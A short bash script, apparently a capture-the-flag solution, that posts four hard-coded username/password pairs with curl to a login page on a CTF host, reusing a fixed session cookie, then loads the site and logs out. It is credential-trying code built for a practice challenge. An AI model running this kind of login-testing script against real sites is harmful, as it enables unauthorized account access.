users() {
    user="$(echo $1 | cut -d ':' -f1)"
    password="$(echo $1 | cut -d ':' -f2)"
    echo $user
    echo $password
    curl -d "user=$user&pass=$password" --cookie-jar - http://web.camsctf.com/f/login.php -b "PHPSESSID=g0af3e498loj4d2a94jrn14nj7"
    curl -d "user=$user&pass=$password" --cookie-jar - http://web.camsctf.com/f/ -b "PHPSESSID=g0af3e498loj4d2a94jrn14nj7"
    curl --cookie-jar - http://web.camsctf.com/f/logout.php -b "PHPSESSID=g0af3e498loj4d2a94jrn14nj7"
}

users "user1:iamprincess"
users "aliston:aliston"
users "iamsomeuser:iamsomepassword"
users "kbarr:barrbarr"
